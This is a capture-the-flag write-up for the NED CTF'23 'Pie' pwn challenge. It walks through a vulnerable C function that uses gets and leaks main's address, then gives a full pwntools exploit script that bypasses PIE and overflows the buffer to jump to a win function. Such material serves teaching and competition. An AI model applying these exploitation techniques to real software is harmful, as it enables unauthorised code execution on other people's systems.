---
title: NED CTF'23 - Pwn - Pie
date: '2023-07-03'
tags: ['ctf', 'pwn', 'nedctf', 'writeup', 'buffer-overflow', 'x64', 'pie', 'leaks', 'offset']
draft: false
summary: Given the leaked address of main function, calculating offset and then overwriting the return address to the win function.
---

## Challenge Description

Leaks are everywhere.

Author: [Saad Akhtar](https://twitter.com/ssaadakhtarr)

```bash
nc 159.223.192.150 9004
```

![chal-info](/static/writeups/nedctf/pwn/pie0.png)

## Solution

Downloading the `pie.zip`, we get the following files

![files](/static/writeups/nedctf/pwn/pie1.png)

The `file` security checks on the binary are as follows

![file](/static/writeups/nedctf/pwn/pie2.png)

Let's run the `pie` binary to check what it does

![run](/static/writeups/nedctf/pwn/pie3.png)

Okay, let's disassemble and check the functions inside ghidra

![ghidra](/static/writeups/nedctf/pwn/pie4.png)

The functions that stand out are `vuln` and the `win` function. By now, we know that `win` often simply reads the `flag.txt` and all we have to do is invoke it. Let's check the `vuln` function:

```c:vuln

void vuln(void) {
  char local_28 [32];
  
  printf("Leaked address: %p\n",main);
  printf("For the last time could you tell me your name please? ");
  gets(local_28);
  printf("\nThank you %s",local_28);
  return;
}
```

Well, the `gets` is here, once again. The buffer is `32` bytes long. The `main` function is also leaked. So, now we know that we need to do the following:

1. Calculate the offset of the `win` function from the `main` function.
2. Overflow the buffer and overwrite the return address to the `win` function.
3. Get the flag.

### 1. Calculating the offset

To do that, we can utilize pwntools, and use the `ELF` module to calculate the offset. By firstly getting the address of main, we change the local ELF's main to re-align to the leaked address

Now, the address of `win` function will become `elf.sym.win`. We also need to add a `ret` gadget, which will be used to return to the `win` function. To do that, we can use the `ROP` module of pwntools. The code for this will be as follows:

The code for this will be as follows:

```python:offset
#!/usr/bin/env python3

from pwn import *
import sys
import re

_bin = './pie'
elf = context.binary = ELF(_bin)

if len(sys.argv) == 2 and sys.argv[1] == 'remote':
	io = remote('159.223.192.150', 9004)
else:
	io = process(_bin)

data = io.read().decode('latin-1')
main_func = re.findall('Leaked address: (.*?)\n', data)[0]
info(f"Address for main function: {main_func}")

info("Patching the ELF address:")
elf.address = int(main_func, 16) - elf.sym.main

info(f"win function found at: {elf.sym.win}")
win_func = p64(elf.sym.win)

rop = ROP(elf)
ret = p64(rop.ret.address)
```

### Overflowing the buffer and getting the flag

Now, since we have the first part done, next thing we need to do is craft the payload. We have the address of `win` function, all we need to do is overwrite the instruction pointer to the address and then we're golden. To do that, we need to calculate the offset of the buffer. Once again, basic math; 32 + 8, i.e. 40. Hence, the offset is 40.

```python:payload
payload = b"A" * 40
payload += ret
payload += win_func
io.sendline(payload)
```

This is the gist of it. The final exploit is:

```python:exploit.py
#!/usr/bin/env python3

from pwn import *
import sys
import re

_bin = './pie'
elf = context.binary = ELF(_bin)

if len(sys.argv) == 2 and sys.argv[1] == 'remote':
	io = remote('159.223.192.150', 9004)
else:
	io = process(_bin)

data = io.read().decode('latin-1')
main_func = re.findall('Leaked address: (.*?)\n', data)[0]
info(f"Address for main function: {main_func}")

info("Patching the ELF address:")
elf.address = int(main_func, 16) - elf.sym.main


info(f"win function found at: {elf.sym.win}")
win_func = p64(elf.sym.win)

rop = ROP(elf)
ret = p64(rop.ret.address)

offset = 40
payload = b'A' * offset + ret + win_func # the payload wasn't working with `flat`.

io.sendline(payload)
buf = io.recv()
try:
	flag = buf.split(b'\n')[-2]
	info(f"Flag: {flag.decode()}")
except:
	info("No flag. An error occurred.")
```

![flag](/static/writeups/nedctf/pwn/pie5.png)

```md
Flag: NCC{pie_byp4ssed_007}
```
